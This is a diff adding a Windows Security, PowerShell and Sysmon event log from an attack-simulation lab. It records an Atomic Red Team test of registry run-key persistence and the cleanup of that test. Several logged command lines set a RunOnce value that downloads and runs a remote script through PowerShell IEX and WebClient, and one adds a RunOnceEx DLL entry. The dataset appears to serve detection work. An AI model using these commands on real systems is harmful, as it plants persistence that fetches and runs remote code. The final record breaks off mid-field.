@@ -1,0 +1,799 @@
+02/17/2022 02:15:47 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907639
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD4C367
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1934
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name \""NextRun\"" -Force -ErrorAction Ignore} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:47 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4674
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Sensitive Privilege Use
+OpCode=Info
+RecordNumber=8907635
+Keywords=Audit Success
+Message=An operation was attempted on a privileged object.
+
+Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD4C367
+
+Object:
+	Object Server:	Security
+	Object Type:	Key
+	Object Name:	\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+	Object Handle:	0xa0
+
+Process Information:
+	Process ID:	0x12a8
+	Process Name:	C:\Windows\System32\reg.exe
+
+Requested Operation:
+	Desired Access:	DELETE
+				READ_CONTROL
+				WRITE_DAC
+				WRITE_OWNER
+				Query key value
+				Set key value
+				Create sub-key
+				Enumerate sub-keys
+				Notify about changes to keys
+				Create Link
+				
+	Privileges:		SeTakeOwnershipPrivilege
+02/17/2022 02:15:47 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907634
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD4C367
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x12a8
+	New Process Name:	C:\Windows\System32\reg.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x17f0
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f  
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:47 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907633
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD4C367
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x17f0
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:47 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=141127
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+{Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}
+
+ScriptBlock ID: 14a57037-b593-40eb-a758-561e555e760a
+Path:
+02/17/2022 02:15:47 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=141125
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+& {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}
+
+ScriptBlock ID: 35bba8c1-f8e3-4b63-8781-717e862b2e22
+Path:
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:47.871069000Z'/><EventRecordID>117078</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>DeleteValue</Data><Data Name='UtcTime'>2022-02-17 02:15:47.855</Data><Data Name='ProcessGuid'>{E163F41D-AFD3-620D-6F14-000000003602}</Data><Data Name='ProcessId'>6452</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:47.710423200Z'/><EventRecordID>117060</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:47.708</Data><Data Name='ProcessGuid'>{E163F41D-AFD3-620D-6F14-000000003602}</Data><Data Name='ProcessId'>6452</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" &amp; {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name \""NextRun\"" -Force -ErrorAction Ignore} </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFD0-620D-67C3-D40000000000}</Data><Data Name='LogonId'>0xd4c367</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{E163F41D-AFD2-620D-6614-000000003602}</Data><Data Name='ParentProcessId'>6356</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbABlAGEAbgB1AHAA</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:47.686265000Z'/><EventRecordID>117051</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>DeleteValue</Data><Data Name='UtcTime'>2022-02-17 02:15:47.683</Data><Data Name='ProcessGuid'>{E163F41D-AFD3-620D-6E14-000000003602}</Data><Data Name='ProcessId'>4776</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:47.682129200Z'/><EventRecordID>117043</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:47.680</Data><Data Name='ProcessGuid'>{E163F41D-AFD3-620D-6E14-000000003602}</Data><Data Name='ProcessId'>4776</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f  </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFD0-620D-67C3-D40000000000}</Data><Data Name='LogonId'>0xd4c367</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{E163F41D-AFD3-620D-6D14-000000003602}</Data><Data Name='ParentProcessId'>6128</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f &gt;nul 2&gt;&amp;1" </Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:47.675175100Z'/><EventRecordID>117034</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:47.673</Data><Data Name='ProcessGuid'>{E163F41D-AFD3-620D-6D14-000000003602}</Data><Data Name='ProcessId'>6128</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f &gt;nul 2&gt;&amp;1" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFD0-620D-67C3-D40000000000}</Data><Data Name='LogonId'>0xd4c367</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A</Data><Data Name='ParentProcessGuid'>{E163F41D-AFD2-620D-6614-000000003602}</Data><Data Name='ParentProcessId'>6356</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbABlAGEAbgB1AHAA</Data></EventData></Event>
+02/17/2022 02:15:42 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907518
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD399E2
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa30
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1be4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""
+set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\"")\""'} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:42 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907515
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD399E2
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1b00
+	New Process Name:	C:\Windows\System32\reg.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x198c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:42 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8907514
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xD399E2
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x198c
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1be4
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:15:42 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=140476
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+{$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'}
+
+ScriptBlock ID: ec6e2a73-74f0-48a4-b76a-f2ae7146a87a
+Path:
+02/17/2022 02:15:42 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=140474
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+& {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'}
+
+ScriptBlock ID: 26d800f8-7604-4208-bfd8-491d84c00434
+Path:
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:42.784354400Z'/><EventRecordID>116644</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2022-02-17 02:15:42.777</Data><Data Name='ProcessGuid'>{E163F41D-AFCE-620D-5014-000000003602}</Data><Data Name='ProcessId'>2608</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun</Data><Data Name='Details'>powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:42.617214200Z'/><EventRecordID>116626</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:42.615</Data><Data Name='ProcessGuid'>{E163F41D-AFCE-620D-5014-000000003602}</Data><Data Name='ProcessId'>2608</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" &amp; {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""
+set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\"")\""'} </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFCB-620D-E299-D30000000000}</Data><Data Name='LogonId'>0xd399e2</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{E163F41D-AFCD-620D-4714-000000003602}</Data><Data Name='ParentProcessId'>7140</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand 